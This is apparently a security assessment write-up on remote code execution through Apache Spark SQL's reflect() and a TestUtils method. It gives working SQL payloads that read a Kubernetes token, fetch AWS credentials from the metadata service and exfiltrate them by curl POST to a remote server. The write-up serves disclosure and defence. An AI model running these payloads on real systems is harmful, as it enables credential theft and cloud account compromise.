---
title:  "Remote Code Execution by Abusing Apache Spark SQL"
layout: post
date:   2022-10-24
---

During a security assessment, I discovered a feature that allowed users to execute arbitrary Spark SQL queries on analytics data.

## Vulnerability
The blog post ["The Dangers of Untrusted Spark SQL Input in a Shared Environment"](https://datapipelines.com/blog/the-dangers-of-untrusted-spark-sql-input-in-a-shared-environment/?ref=blog.stratumsecurity.com) mentioned two functions that allowed Java code execution. However, the java.lang.Runtime class and its getRuntime().exec() method couldn't be used because the Spark SQL functions reflect() and java_method() only supported calling static methods from classes without instantiation. I needed to find a Java class with a static method to exploit the Spark SQL functionality.

I was able to retrieve environment variables and system properties using the following SQL queries:
{% highlight sql %}
-- List environment variables
SELECT reflect('java.lang.System', 'getenv')

-- List system properties
SELECT reflect('java.lang.System', 'getProperties')
{% endhighlight %}

While the environment variables and system properties revealed nothing sensitive, the system properties did expose the Spark version, which later helped me achieve remote code execution.

## Path to Exploitation
While reviewing the Spark JavaDocs, I found a class called **org.apache.spark.TestUtils** with a static method, **testCommandAvailable()**.

Upon reviewing the code on GitHub, I discovered that **Process(command).run()** allowed system commands to be executed.

I crafted a Spark SQL payload using this method to execute system commands and was able to disclose the Kubernetes API token and AWS keys with excessive permissions using the following queries:
{% highlight sql %}
-- Read Kubernetes API token file
SELECT * FROM csv.`/var/run/secrets/kubernetes.io/serviceaccount/token`

-- Write the AWS keys to a file
SELECT reflect('org.apache.spark.TestUtils', 'testCommandAvailable', 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/euwe1-redacted -o /opt/test.txt')

-- Send the file contents to a remote controlled server to view
SELECT reflect('org.apache.spark.TestUtils', 'testCommandAvailable', 'curl -X POST -F data=@/opt/test.txt http://remoteserver.example.com/test5.txt')
{% endhighlight %}

<figure>
  <img src="/assets/images/2022/awskeys-disclosed.png">
  <figcaption>Figure 1 – Disclosed AWS keys with code execution</figcaption>
</figure>  

After obtaining their AWS keys and verifying permissions, I listed all the S3 buckets accessible with those keys as a proof of concept for the report.

<figure>
  <img src="/assets/images/2022/buckets-listed.png">
  <figcaption>Figure 2 – Listed S3 buckets using disclosed AWS keys</figcaption>
</figure>  
